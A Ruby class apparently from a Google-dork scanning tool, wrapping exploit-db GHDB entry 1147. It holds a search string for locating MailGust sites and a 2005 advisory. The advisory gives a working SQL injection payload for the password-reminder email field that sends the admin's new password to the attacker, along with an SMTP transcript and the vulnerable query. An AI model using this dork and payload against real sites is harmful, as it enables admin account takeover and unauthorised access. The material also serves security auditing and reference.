module Dorks
   class Dork1147 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1147",
            ghdb_url: "https://www.exploit-db.com/ghdb/1147",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-09-26",
            author: "anonymous",
            dork: <<~EDORK,
"powered by mailgust"
EDORK
            description: <<~EDESC
MailGust 1.9/2.0 (possibly prior versions) SQL injection / board takevorsoftware:site: http://www.mailgust.org/description:Mailgust is three softwares in one: * Mailing list manager * Newsletter distribution tool * Message Board Mailgust is written in php and uses a mysql database. vulnerability:if magic quotes off -> SQL Injectionwithout to have an account, a user can send himself a new admin password usingpassword reminder, in email field type:[yuor_email],'or'a'='a'/*@hotmail.comgive a look to what happen:220 [MAILSERVER] SMTP Service readyHELO [MAILGUST]250 [MAILSERVER].MAIL FROM:250 MAIL FROM: OKRCPT TO:250 RCPT TO:>[your_email] OKRCPT TO: OKDATA354 Start mail input; end with .Date: Sat, 24 Sep 2005 16:11:38 +0100Subject: New passwordTo: [your_email],'or'a'='a'/*@hotmail.comFrom: systemxxx@localhost.comYour login name is: [admin_email]Your new password is: 4993587Click here:http://localhost/mailgust/index.php?method=activate_new_password&list=maillistuser&pwd=4993587&id=1756185114to activate the password, than try to log in!It is recommended that you change your password afterwards..250 Mail acceptedQUIT221 [MAILSERVER] QUITvulnerable query is in [path_to_mailgust]/gorum/user_email.php at line 363:...$query = "SELECT * FROM $applName"."_$userClassName ". "WHERE email='$this->email'";...it becomes:SELECT * FROM maillist_maillistuser WHERE email='[yuor_email],'or'a'='a'/*@hotmail.com'"or'a'='a'" is always true, so the query is always true, script doesn't fail, for mail function, theese are two valid email address,it will send the mail to [your_email] and to 'or'a'='a'/*@hotmail.com ;)activate the password, now you can login with [admin_email] as user and new passwordu can find my poc exploit here:http://rgod.altervista.org/maildisgust.html
EDESC
         })

      end
   end
end
